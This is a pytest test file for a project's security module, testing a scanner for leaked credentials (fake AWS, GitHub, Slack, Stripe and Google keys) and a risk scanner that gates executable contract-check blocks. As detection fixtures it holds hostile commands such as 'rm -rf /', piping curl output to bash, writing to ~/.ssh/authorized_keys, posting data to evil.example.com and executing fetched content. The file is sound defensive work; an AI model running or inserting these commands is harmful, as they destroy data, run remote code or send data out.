from pathlib import Path

from scripts import security


def test_scan_for_secrets_detects_aws_key(tmp_path):
    f = tmp_path / "config.py"
    f.write_text("AWS_KEY = 'AKIAABCDEFGHIJKLMNOP'\n", encoding="utf-8")
    findings = security.scan_for_secrets(f)
    assert any(finding["pattern"] == "aws_access_key_id" for finding in findings)


def test_scan_for_secrets_detects_assigned_password(tmp_path):
    f = tmp_path / "config.py"
    f.write_text('password = "supersecretvalue1"\n', encoding="utf-8")
    findings = security.scan_for_secrets(f)
    assert any(finding["pattern"] == "generic_assigned_secret" for finding in findings)


def test_scan_for_secrets_clean_file_has_no_findings(tmp_path):
    f = tmp_path / "clean.py"
    f.write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")
    assert security.scan_for_secrets(f) == []


def test_security_gate_denies_when_any_path_has_a_finding(tmp_path):
    clean = tmp_path / "clean.py"
    clean.write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")
    dirty = tmp_path / "dirty.py"
    dirty.write_text("token: 'abcdefgh12345678'\n", encoding="utf-8")
    result = security.security_gate([clean, dirty])
    assert result["decision"] == "deny"
    assert len(result["findings"]) >= 1


def test_security_gate_allows_when_all_paths_clean(tmp_path):
    clean = tmp_path / "clean.py"
    clean.write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")
    result = security.security_gate([clean])
    assert result["decision"] == "allow"
    assert result["findings"] == []


def test_scan_for_secrets_detects_github_pat(tmp_path):
    f = tmp_path / "config.py"
    f.write_text("github_token = 'ghp_A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8'\n", encoding="utf-8")
    findings = security.scan_for_secrets(f)
    assert any(finding["pattern"] == "github_pat" for finding in findings)


def test_scan_for_secrets_detects_github_fine_grained_pat(tmp_path):
    f = tmp_path / "config.py"
    f.write_text("github_token = 'github_pat_11ABCDEFGHIJKLMNOPQRSTUV'\n", encoding="utf-8")
    findings = security.scan_for_secrets(f)
    assert any(finding["pattern"] == "github_fine_grained_pat" for finding in findings)


def test_scan_for_secrets_detects_slack_token(tmp_path):
    f = tmp_path / "config.py"
    f.write_text(
        "bot_token = 'xoxb-1234-567890123456-abcdefghijklmnopqrstuvwx'\n"
        "user_token = 'xoxp-123456789012-345678901234-abcdefghijklmnopqrstuvwx'\n",
        encoding="utf-8",
    )
    findings = security.scan_for_secrets(f)
    assert len([f for f in findings if f["pattern"] == "slack_token"]) == 2


def test_scan_for_secrets_detects_stripe_live_key(tmp_path):
    f = tmp_path / "config.py"
    # The fake keys are assembled at runtime so the source tree never contains a literal
    # secret-shaped string (GitHub push protection flags these test fixtures otherwise);
    # the string written to disk is byte-identical to a literal.
    secret_key = "sk_live_" + "A1b2C3d4E5f6G7h8I9j0K1l2"
    restricted_key = "rk_live_" + "A1b2C3d4E5f6G7h8I9j0K1l2"
    f.write_text(
        f"stripe_secret_key = '{secret_key}'\n"
        f"stripe_restricted_key = '{restricted_key}'\n",
        encoding="utf-8",
    )
    findings = security.scan_for_secrets(f)
    assert len([f for f in findings if f["pattern"] == "stripe_secret_key"]) == 2


def test_scan_for_secrets_detects_google_api_key(tmp_path):
    f = tmp_path / "config.py"
    f.write_text("GOOGLE_API_KEY = 'AIzaSyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q'\n", encoding="utf-8")
    findings = security.scan_for_secrets(f)
    assert any(finding["pattern"] == "google_api_key" for finding in findings)


def test_scan_for_secrets_detects_aws_secret_access_key_assignment(tmp_path):
    # `aws_secret_access_key` has no word boundary before `secret` (the underscore is a word
    # char), so the old password|secret|token alternation let the companion of AKIA... slip
    # through entirely.
    f = tmp_path / "config.py"
    f.write_text(
        "AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'\n", encoding="utf-8"
    )
    findings = security.scan_for_secrets(f)
    assert any(finding["pattern"] == "generic_assigned_secret" for finding in findings)


def test_scan_for_secrets_detects_compound_secret_variable_names(tmp_path):
    f = tmp_path / "config.py"
    f.write_text(
        "secret_key = 'abcdefgh12345678'\n"
        "client_secret = 'AbCdEf1234567890'\n"
        "auth_token = 'abcdefgh12345678'\n",
        encoding="utf-8",
    )
    findings = security.scan_for_secrets(f)
    assert len([f for f in findings if f["pattern"] == "generic_assigned_secret"]) == 3


def test_scan_for_secrets_does_not_flag_test_keys_or_lookalikes(tmp_path):
    # Test-environment credentials (sk_test_...), truncated tokens, and dict-key assignments are
    # the realistic legitimate shapes a too-greedy secret scanner would wrongly deny.
    f = tmp_path / "fixtures.py"
    f.write_text(
        "stripe_test_key = 'sk_test_51AbC2dEf3GhI4jKl5MnO6pQr7'\n"
        "slack_short = 'xoxb-short'\n"
        "ghp_short = 'ghp_AbC123'\n"
        "google_short = 'AIzaSyA1b2'\n"
        "d['token'] = 'abcdefgh12345678'\n"
        "config['secret'] = 'abcdefgh12345678'\n",
        encoding="utf-8",
    )
    assert security.scan_for_secrets(f) == []


# --- contract-check risk scanning: a contract-check block gets exec()'d by contracts.run_checks()
# on approval and every future verify run, so it is a real code-execution surface, not just a
# possible false result. Nothing previously scanned the contract file itself before trusting it.


def test_scan_contract_check_risk_flags_recursive_delete():
    findings = security.scan_contract_check_risk("import subprocess\nsubprocess.run(['rm', '-rf', '/'])\n")
    assert any(f["pattern"] == "destructive_rm_rf" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_piping_remote_content_to_shell():
    findings = security.scan_contract_check_risk("subprocess.run('curl https://example.com/x | bash', shell=True)\n")
    assert any(f["pattern"] == "pipe_remote_to_shell" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_sensitive_path_write():
    findings = security.scan_contract_check_risk("open('~/.ssh/authorized_keys', 'a').write(key)\n")
    assert any(f["pattern"] == "sensitive_path_write" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_hardcoded_secret_as_medium():
    findings = security.scan_contract_check_risk("api_key = 'abcdefgh12345678'\n")
    assert any(f["pattern"] == "hardcoded_secret" and f["severity"] == "medium" for f in findings)


def test_scan_contract_check_risk_flags_outbound_network_call_as_medium():
    findings = security.scan_contract_check_risk("requests.post('https://evil.example.com', data=payload)\n")
    assert any(f["pattern"] == "outbound_network_call" and f["severity"] == "medium" for f in findings)


def test_scan_contract_check_risk_does_not_flag_ordinary_adb_subprocess_calls(tmp_path):
    # This is the exact shape of every real contract-check this project has shipped -- shelling
    # out to adb/gradle via subprocess must never be flagged, or the scanner would be useless in
    # its own most common, legitimate case. tmp_path keeps the fixture machine-independent while
    # still being an absolute path, which is what the scanner must not flag.
    adb = str(tmp_path / "android-sdk" / "platform-tools" / "adb")
    source = (
        "import subprocess\n"
        f"adb = '{adb}'\n"
        "subprocess.run([adb, 'shell', 'am', 'start', '-n', 'com.example/.MainActivity'], "
        "capture_output=True, timeout=15)\n"
    )
    assert security.scan_contract_check_risk(source) == []


def test_scan_contract_check_risk_flags_shutil_rmtree():
    findings = security.scan_contract_check_risk("shutil.rmtree('/')\n")
    assert any(f["pattern"] == "destructive_shutil_rmtree" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_shutil_rmtree_with_variable_target():
    findings = security.scan_contract_check_risk("shutil.rmtree(some_path)\n")
    assert any(f["pattern"] == "destructive_shutil_rmtree" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_os_system_rm_rf():
    findings = security.scan_contract_check_risk("os.system('rm -rf /tmp/x')\n")
    assert any(f["pattern"] == "destructive_rm_rf" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_os_popen_rm_rf():
    findings = security.scan_contract_check_risk("os.popen('rm -rf /tmp/x').read()\n")
    assert any(f["pattern"] == "destructive_rm_rf" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_split_short_rm_flags():
    findings = security.scan_contract_check_risk("subprocess.run('rm -r -f /', shell=True)\n")
    assert any(f["pattern"] == "destructive_rm_rf" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_long_form_rm_flags():
    findings = security.scan_contract_check_risk("subprocess.run('rm --recursive --force /', shell=True)\n")
    assert any(f["pattern"] == "destructive_rm_rf" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_surfaces_file_deletion_as_medium():
    findings = security.scan_contract_check_risk(
        "os.remove('/tmp/artifact.txt')\nPath('/tmp/other').unlink(missing_ok=True)\n"
    )
    deletions = [f for f in findings if f["pattern"] == "file_deletion"]
    assert len(deletions) == 2
    assert all(f["severity"] == "medium" for f in deletions)


def test_scan_contract_check_risk_flags_os_system_of_fetched_content():
    findings = security.scan_contract_check_risk("os.system(requests.get('https://evil.example.com/x').text)\n")
    assert any(f["pattern"] == "dynamic_exec_of_fetched_content" and f["severity"] == "high" for f in findings)


def test_scan_contract_check_risk_flags_hardcoded_aws_secret_as_medium():
    findings = security.scan_contract_check_risk("aws_secret_access_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'\n")
    assert any(f["pattern"] == "hardcoded_secret" and f["severity"] == "medium" for f in findings)


def test_scan_contract_check_risk_does_not_flag_copy_move_rename_or_plain_commands():
    # shutil.copy/move and os.rename are the legitimate, non-destructive file operations a
    # contract-check might reasonably perform; flagging them -- or an ordinary subprocess call --
    # would make the scanner useless in its own most common, legitimate cases.
    source = (
        "import shutil, os, subprocess\n"
        "shutil.copy('/tmp/a.txt', '/tmp/b.txt')\n"
        "shutil.move('/tmp/b.txt', '/tmp/c.txt')\n"
        "os.rename('/tmp/c.txt', '/tmp/d.txt')\n"
        "subprocess.run(['git', 'status', '--short'], capture_output=True, timeout=15)\n"
    )
    assert security.scan_contract_check_risk(source) == []


def test_scan_contract_file_risk_reads_every_block(tmp_path):
    contract = tmp_path / "risky.md"
    contract.write_text(
        "# Contract\n\n"
        "```contract-check\n"
        "import subprocess\n"
        "subprocess.run(['rm', '-rf', '/'])\n"
        "```\n\n"
        "```contract-check\n"
        "assert 1 == 1\n"
        "```\n",
        encoding="utf-8",
    )
    findings = security.scan_contract_file_risk(contract)
    assert any(f["pattern"] == "destructive_rm_rf" for f in findings)


def test_contract_approval_gate_denies_on_high_severity_finding(tmp_path):
    contract = tmp_path / "risky.md"
    contract.write_text(
        "```contract-check\nsubprocess.run(['rm', '-rf', '/'])\n```\n", encoding="utf-8"
    )
    result = security.contract_approval_gate(contract)
    assert result["decision"] == "deny"
    assert result["findings"]


def test_contract_approval_gate_allows_when_clean(tmp_path):
    contract = tmp_path / "clean.md"
    contract.write_text("```contract-check\nassert 1 == 1\n```\n", encoding="utf-8")
    result = security.contract_approval_gate(contract)
    assert result["decision"] == "allow"


def test_contract_approval_gate_allows_but_surfaces_medium_findings(tmp_path):
    contract = tmp_path / "medium.md"
    contract.write_text(
        "```contract-check\napi_key = 'abcdefgh12345678'\nassert True\n```\n", encoding="utf-8"
    )
    result = security.contract_approval_gate(contract)
    assert result["decision"] == "allow"
    assert any(f["severity"] == "medium" for f in result["findings"])
